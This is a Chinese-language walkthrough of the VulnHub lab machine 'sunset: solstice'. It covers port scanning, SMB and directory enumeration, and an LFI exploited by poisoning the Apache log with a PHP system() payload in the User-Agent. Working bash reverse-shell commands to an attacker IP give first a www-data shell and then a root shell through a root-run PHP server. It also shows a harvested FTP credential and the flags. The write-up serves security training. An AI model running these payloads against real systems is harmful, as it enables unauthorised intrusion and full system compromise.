# sunset: solstice

2024-5-21 https://www.vulnhub.com/entry/sunset-solstice,499/

difficulty: Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 21,22,25,80,139,445,2121,3128,8593,54787,62524

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.5.30:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5ba737fd556cf8ea03f510bc94320718 (RSA)
|   256 abda6a6f973fb2703e6c2b4b0cb7f64c (ECDSA)
|_  256 ae29d4e346a1b15227838f8fb0c436d1 (ED25519)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-commands: solstice Hello nmap.scanme.org [192.168.5.3], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.5.30:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  tcpwrapped
```

端口很多，估计会有一些坑。

21 的 ftp 端口，不允许匿名登陆。

2121 的 ftp 端口，允许匿名登陆：

```
drws------   2 www-data www-data     4096 Jun 18  2020 pub
```

同时看到 pub 文件夹所属用户为 www-data。

看到有 SMB 端口开放，枚举看看有什么信息：

```
smbclient -L //192.168.5.30 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SOLSTICE
```

没用自定义的开放目录，这里没有提权点。

25 端口 smtp 也没有用户名和密码，暂时用不了。

看看 80 web 服务，看到首页底部的 cms 版本：phpIPAM 1.4，使用 gobuster 扫描看看是否还有其他目录：

```
http://192.168.5.30/app                  (Status: 301) [Size: 310] [--> http://192.168.5.30/app/]
http://192.168.5.30/javascript           (Status: 301) [Size: 317] [--> http://192.168.5.30/javascript/]
http://192.168.5.30/backup               (Status: 301) [Size: 313] [--> http://192.168.5.30/backup/]
```

/backup 是个上传页面，但是测试后，发现不能上传。

8593 端口对应的是一个 web 服务，http://192.168.5.30:8593/index.php?book=list 页面上发现了这样的链接 ，可能存在 LFI 漏洞，尝试看看：

```
curl "http://192.168.5.30:8593/index.php?book=../../../../../etc/passwd"

root:x:0:0:root:/root:/bin/bash
...
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
```

证明存在 LFI 漏洞，继续寻找，看看能有哪些文件能读取到：

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.30:8593/index.php?book=../../../../..FUZZ -fs 376

/etc/samba/smb.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
```

能够得到 80 端口对应的 access.log 文件，所以直接利用 curl 将 php 代码写入到 UA 中，这样在包含这个日志文件，就能实现 php 代码执行：

```
curl -A 'AAAA<?php system($_GET[1]);?>' http://192.168.5.30/backup
curl -G --data-urlencode "book=../../../../../var/log/apache2/access.log" --data-urlencode '1=bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.30:8593/index.php
```

在 kali 上监听 8888 端口，就能得到反弹的 shell:

```
www-data@solstice:/var/tmp/webserver$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先升级下 tty,目标系统有 /usr/bin/python：

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

进入系统后，进行系统枚举。/home/miguel 目录中有 user.txt 文件，但是 www-data 用户不能读取，需要先升级到 miguel 才行。

ps -ef 发现了一些系统运行程序：

```
root  460   448  0 May20 ?  00:00:00 /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/
root  450   436  0 May20 ?  00:00:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
```

其中以 root 用户启动 php 监听本地 57 端口，/var/tmp/sv/ 这个目录，对 www-data 可写，我们可以写入 wenshell，反弹连接至 kali，在 kali 上监听 7777 端口：

```
echo "<?php system('bash -c \"/bin/bash -i >& /dev/tcp/192.168.5.3/7777 0>&1\"')?>" > shell.php

www-data@solstice:/var/tmp/sv$ cat shell.php

<?php system("bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/7777 0>&1'")?>

curl http://127.0.0.1:57/shell.php
```

在 kali 上得到了以 root 身份反弹的 shell：

```
root@solstice:/var/tmp/sv# id
id
uid=0(root) gid=0(root) groups=0(root)

root@solstice:/home/miguel# cat user.txt
cat user.txt
c0e1f61ff8e753d8b27615bdc4f25794

root@solstice:~# cat root.txt
cat root.txt

No ascii art for you >:(

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

f950998f0d484a2ef1ea83ed4f42bbca
```
